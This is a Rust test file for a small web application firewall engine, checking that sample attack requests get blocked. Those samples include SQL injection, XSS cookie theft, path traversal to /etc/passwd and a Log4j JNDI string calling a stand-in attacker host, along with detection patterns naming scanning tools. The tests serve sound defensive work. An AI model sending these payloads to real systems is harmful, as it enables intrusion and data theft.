use super::config::{WafLiteSnapshot, WafMode, WafRuleInput};
use super::engine::{WafLiteEngine, WafLiteRequest};

#[test]
fn test_sql_injection_detection() {
    let snap = WafLiteSnapshot {
        patterns: vec!["union select".to_string(), "or 1=1".to_string()],
        ..Default::default()
    };
    let raw = serde_json::to_vec(&snap).unwrap();
    let engine = WafLiteEngine::from_snapshot(&raw).unwrap();

    let req = WafLiteRequest {
        query: b"",
        path: b"/api/v1/users?id=1%20union%20select%20password%20from%20users",
        host: b"example.com",
        method: b"GET",
        client_ip: b"192.168.1.1",
    };

    let decision = engine.evaluate(req, |_| None).unwrap();
    assert_eq!(decision.action, 1, "SQLi must be blocked (action = 1)");
    assert_eq!(decision.log_matches, 1);
}

#[test]
fn test_framework_exploit_log4j_in_header() {
    let snap = WafLiteSnapshot {
        patterns: vec!["${jndi:".to_string()],
        ..Default::default()
    };
    let raw = serde_json::to_vec(&snap).unwrap();
    let engine = WafLiteEngine::from_snapshot(&raw).unwrap();

    let req = WafLiteRequest {
        query: b"",
        path: b"/api/v1/login",
        host: b"example.com",
        method: b"POST",
        client_ip: b"10.0.0.1",
    };

    // Attacker sends Log4j exploit in User-Agent header
    let decision = engine
        .evaluate(req, |h| {
            if h == "user-agent" {
                Some(b"${jndi:ldap://evil.attacker.com:1389/a}")
            } else {
                None
            }
        })
        .unwrap();

    assert_eq!(decision.action, 1, "Log4j RCE in header must be blocked");
    assert_eq!(decision.log_matches, 1);
}

#[test]
fn test_framework_exploit_spring4shell() {
    let snap = WafLiteSnapshot {
        patterns: vec!["class.module.classloader".to_string()],
        ..Default::default()
    };
    let raw = serde_json::to_vec(&snap).unwrap();
    let engine = WafLiteEngine::from_snapshot(&raw).unwrap();

    let req = WafLiteRequest {
        query: b"",
        path: b"/helloworld?class.module.classLoader.resources.context.parent.pipeline.first.pattern=exploit",
        host: b"example.com",
        method: b"POST",
        client_ip: b"10.0.0.1",
    };

    let decision = engine.evaluate(req, |_| None).unwrap();
    assert_eq!(decision.action, 1, "Spring4Shell must be blocked");
}

#[test]
fn test_framework_exploit_laravel_ignition() {
    let snap = WafLiteSnapshot {
        patterns: vec!["_ignition/execute-solution".to_string()],
        ..Default::default()
    };
    let raw = serde_json::to_vec(&snap).unwrap();
    let engine = WafLiteEngine::from_snapshot(&raw).unwrap();

    let req = WafLiteRequest {
        query: b"",
        path: b"/_ignition/execute-solution",
        host: b"example.com",
        method: b"POST",
        client_ip: b"10.0.0.1",
    };

    let decision = engine.evaluate(req, |_| None).unwrap();
    assert_eq!(decision.action, 1, "Laravel Ignition RCE must be blocked");
}

#[test]
fn test_sensitive_files_probe_env_and_git() {
    let snap = WafLiteSnapshot {
        patterns: vec![".env".to_string(), ".git/".to_string()],
        ..Default::default()
    };
    let raw = serde_json::to_vec(&snap).unwrap();
    let engine = WafLiteEngine::from_snapshot(&raw).unwrap();

    // Probe .env
    let req_env = WafLiteRequest {
        query: b"",
        path: b"/.env",
        host: b"example.com",
        method: b"GET",
        client_ip: b"10.0.0.1",
    };
    assert_eq!(engine.evaluate(req_env, |_| None).unwrap().action, 1);

    // Probe .git/config
    let req_git = WafLiteRequest {
        query: b"",
        path: b"/.git/config",
        host: b"example.com",
        method: b"GET",
        client_ip: b"10.0.0.1",
    };
    assert_eq!(engine.evaluate(req_git, |_| None).unwrap().action, 1);
}

#[test]
fn test_node_prototype_pollution() {
    let snap = WafLiteSnapshot {
        patterns: vec!["__proto__".to_string(), "constructor.prototype".to_string()],
        ..Default::default()
    };
    let raw = serde_json::to_vec(&snap).unwrap();
    let engine = WafLiteEngine::from_snapshot(&raw).unwrap();

    let req = WafLiteRequest {
        query: b"",
        path: b"/api/v1/user?__proto__[admin]=true",
        host: b"example.com",
        method: b"POST",
        client_ip: b"10.0.0.1",
    };
    assert_eq!(engine.evaluate(req, |_| None).unwrap().action, 1);
}

#[test]
fn test_xss_detection() {
    let snap = WafLiteSnapshot {
        patterns: vec!["<script".to_string(), "javascript:".to_string()],
        ..Default::default()
    };
    let raw = serde_json::to_vec(&snap).unwrap();
    let engine = WafLiteEngine::from_snapshot(&raw).unwrap();

    let req = WafLiteRequest {
        query: b"",
        path: b"/search?q=<script>alert(document.cookie)</script>",
        host: b"example.com",
        method: b"GET",
        client_ip: b"10.0.0.1",
    };
    assert_eq!(engine.evaluate(req, |_| None).unwrap().action, 1);
}

#[test]
fn test_path_traversal_detection() {
    let snap = WafLiteSnapshot {
        patterns: vec!["../..".to_string()],
        ..Default::default()
    };
    let raw = serde_json::to_vec(&snap).unwrap();
    let engine = WafLiteEngine::from_snapshot(&raw).unwrap();

    let req = WafLiteRequest {
        query: b"",
        path: b"/static/../../etc/passwd",
        host: b"example.com",
        method: b"GET",
        client_ip: b"10.0.0.1",
    };
    assert_eq!(engine.evaluate(req, |_| None).unwrap().action, 1);
}

#[test]
fn test_url_encoded_traversal_evasion() {
    let snap = WafLiteSnapshot {
        patterns: vec!["../..".to_string()],
        ..Default::default()
    };
    let raw = serde_json::to_vec(&snap).unwrap();
    let engine = WafLiteEngine::from_snapshot(&raw).unwrap();

    // %2e%2e%2f%2e%2e%2f is URL-encoded ../../
    let req = WafLiteRequest {
        query: b"",
        path: b"/static/%2e%2e%2f%2e%2e%2fetc/passwd",
        host: b"example.com",
        method: b"GET",
        client_ip: b"10.0.0.1",
    };
    assert_eq!(engine.evaluate(req, |_| None).unwrap().action, 1);
}

#[test]
fn test_empty_patterns_allows_all() {
    let snap = WafLiteSnapshot::default();
    let raw = serde_json::to_vec(&snap).unwrap();
    let engine = WafLiteEngine::from_snapshot(&raw).unwrap();

    assert_eq!(engine.patterns_count(), 0);

    let req = WafLiteRequest {
        query: b"",
        path: b"/api/v1/users?id=1",
        host: b"example.com",
        method: b"GET",
        client_ip: b"192.168.1.1",
    };

    let decision = engine.evaluate(req, |_| None).unwrap();
    assert_eq!(decision.action, 0);
}

#[test]
fn test_structured_rules_input() {
    let snap = WafLiteSnapshot {
        rules: vec![
            WafRuleInput {
                pattern: "sqlmap".to_string(),
                description: Some("Automated SQL injection tool".to_string()),
            },
            WafRuleInput {
                pattern: "nikto".to_string(),
                description: Some("Vulnerability scanner".to_string()),
            },
        ],
        ..Default::default()
    };
    let raw = serde_json::to_vec(&snap).unwrap();
    let engine = WafLiteEngine::from_snapshot(&raw).unwrap();

    assert_eq!(engine.patterns_count(), 2);

    let req = WafLiteRequest {
        query: b"",
        path: b"/api/v1/test",
        host: b"example.com",
        method: b"GET",
        client_ip: b"10.0.0.1",
    };

    let decision = engine
        .evaluate(req, |h| {
            if h == "user-agent" {
                Some(b"sqlmap/1.5.2#stable (http://sqlmap.org)")
            } else {
                None
            }
        })
        .unwrap();

    assert_eq!(
        decision.action, 1,
        "Structured rule pattern must match header"
    );
}

#[test]
fn test_clean_request_allowed() {
    let snap = WafLiteSnapshot {
        patterns: vec![
            "union select".to_string(),
            "${jndi:".to_string(),
            "../..".to_string(),
        ],
        ..Default::default()
    };
    let raw = serde_json::to_vec(&snap).unwrap();
    let engine = WafLiteEngine::from_snapshot(&raw).unwrap();

    let req = WafLiteRequest {
        query: b"",
        path: b"/api/v1/orders/12345/items",
        host: b"example.com",
        method: b"GET",
        client_ip: b"192.168.1.1",
    };

    let decision = engine
        .evaluate(req, |h| {
            if h == "user-agent" {
                Some(b"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)")
            } else {
                None
            }
        })
        .unwrap();

    assert_eq!(decision.action, 0, "Clean request must be allowed");
}

#[test]
fn test_whitelist_path_bypass() {
    let snap = WafLiteSnapshot {
        patterns: vec!["union select".to_string()],
        whitelist_paths: vec!["/healthz".to_string(), "/metrics".to_string()],
        ..Default::default()
    };

    let raw = serde_json::to_vec(&snap).unwrap();
    let engine = WafLiteEngine::from_snapshot(&raw).unwrap();

    // 1. Exact match on /healthz (with query string) -> must bypass
    let req1 = WafLiteRequest {
        query: b"test=union%20select",
        path: b"/healthz",
        host: b"example.com",
        method: b"GET",
        client_ip: b"192.168.1.1",
    };
    let decision1 = engine.evaluate(req1, |_| None).unwrap();
    assert_eq!(
        decision1.action, 0,
        "Exact whitelisted path must bypass WAF"
    );

    // 2. Exact match on /metrics -> must bypass
    let req2 = WafLiteRequest {
        query: b"",
        path: b"/metrics",
        host: b"example.com",
        method: b"GET",
        client_ip: b"192.168.1.1",
    };
    let decision2 = engine.evaluate(req2, |_| None).unwrap();
    assert_eq!(
        decision2.action, 0,
        "Exact whitelisted path must bypass WAF"
    );

    // 3. Subpath evasion attempt (/healthz/evil/union%20select) is NOT exact match -> MUST BE BLOCKED
    let req3 = WafLiteRequest {
        query: b"",
        path: b"/healthz/evil/union%20select",
        host: b"example.com",
        method: b"GET",
        client_ip: b"192.168.1.1",
    };
    let decision3 = engine.evaluate(req3, |_| None).unwrap();
    assert_eq!(
        decision3.action, 1,
        "Subpath evasion must not bypass exact-match whitelist"
    );

    // 4. URL-encoded whitelist path (/%68%65%61%6c%74%68%7a) decoded and matched in the same pass!
    let req4 = WafLiteRequest {
        query: b"",
        path: b"/%68%65%61%6c%74%68%7a",
        host: b"example.com",
        method: b"GET",
        client_ip: b"192.168.1.1",
    };
    let decision4 = engine.evaluate(req4, |_| None).unwrap();
    assert_eq!(
        decision4.action, 0,
        "URL-encoded whitelisted path must bypass WAF in unified pass"
    );
}

#[test]
fn test_whitelist_numerical_arithmetic_matcher_many_paths() {
    // Test 10 paths (exercising >8 path slots)
    let paths = vec![
        "/p1".to_string(),
        "/p2".to_string(),
        "/p3".to_string(),
        "/p4".to_string(),
        "/p5".to_string(),
        "/p6".to_string(),
        "/p7".to_string(),
        "/p8".to_string(),
        "/p9".to_string(),
        "/p10".to_string(),
    ];
    let snap = WafLiteSnapshot {
        patterns: vec!["union select".to_string()],
        whitelist_paths: paths,
        ..Default::default()
    };

    let raw = serde_json::to_vec(&snap).unwrap();
    let engine = WafLiteEngine::from_snapshot(&raw).unwrap();

    // Verify slot 0 (/p1)
    let r1 = engine
        .evaluate(
            WafLiteRequest {
                path: b"/p1",
                ..Default::default()
            },
            |_| None,
        )
        .unwrap();
    assert_eq!(r1.action, 0);

    // Verify slot 9 (/p10)
    let r9 = engine
        .evaluate(
            WafLiteRequest {
                path: b"/p10",
                ..Default::default()
            },
            |_| None,
        )
        .unwrap();
    assert_eq!(r9.action, 0);

    // Non-whitelisted path with attack
    let r_bad = engine
        .evaluate(
            WafLiteRequest {
                path: b"/p11/union%20select",
                ..Default::default()
            },
            |_| None,
        )
        .unwrap();
    assert_eq!(r_bad.action, 1);
}

#[test]
fn test_waf_log_mode_monitoring_only() {
    let snap = WafLiteSnapshot {
        mode: WafMode::Log, // Monitor only, do not block
        patterns: vec!["union select".to_string()],
        ..Default::default()
    };

    let raw = serde_json::to_vec(&snap).unwrap();
    let engine = WafLiteEngine::from_snapshot(&raw).unwrap();

    let req = WafLiteRequest {
        query: b"",
        path: b"/api/v1?id=1%20union%20select%201",
        host: b"example.com",
        method: b"GET",
        client_ip: b"10.0.0.1",
    };

    let decision = engine.evaluate(req, |_| None).unwrap();
    assert_eq!(decision.action, 0, "Log mode must not block request");
    assert_eq!(
        decision.log_matches, 1,
        "Log mode must flag log_matches = 1"
    );
}

#[test]
fn test_branchless_url_decode_with_prefix_skip() {
    use super::engine::{url_decode_into, url_decode_into_from};

    let mut buf = [0u8; 128];
    let input = b"/api/v1/orders/12345?query=hello+world%20test%21";
    let first_pos = memchr::memchr2(b'%', b'+', input).unwrap();
    assert_eq!(first_pos, 32);

    let decoded = url_decode_into_from(input, &mut buf, first_pos).unwrap();
    assert_eq!(decoded, b"/api/v1/orders/12345?query=hello world test!");

    // Test with standard 0 offset
    let mut buf2 = [0u8; 128];
    let decoded2 = url_decode_into(input, &mut buf2).unwrap();
    assert_eq!(decoded2, b"/api/v1/orders/12345?query=hello world test!");
}

#[test]
fn test_branchless_url_decode_edge_cases() {
    use super::engine::url_decode_into;

    let mut buf = [0u8; 64];

    // Incomplete hex (%2 at end)
    let d1 = url_decode_into(b"/test%2", &mut buf).unwrap();
    assert_eq!(d1, b"/test%2");

    // Invalid hex characters (%zz)
    let d2 = url_decode_into(b"/test%zz", &mut buf).unwrap();
    assert_eq!(d2, b"/test%zz");

    // Mixed case hex (%2f and %2F)
    let d3 = url_decode_into(b"%2f%2F", &mut buf).unwrap();
    assert_eq!(d3, b"//");

    // Multiple plus signs
    let d4 = url_decode_into(b"a+++b", &mut buf).unwrap();
    assert_eq!(d4, b"a   b");

    // Clean string (no decode needed)
    let d5 = url_decode_into(b"/clean/path", &mut buf).unwrap();
    assert_eq!(d5, b"/clean/path");
}
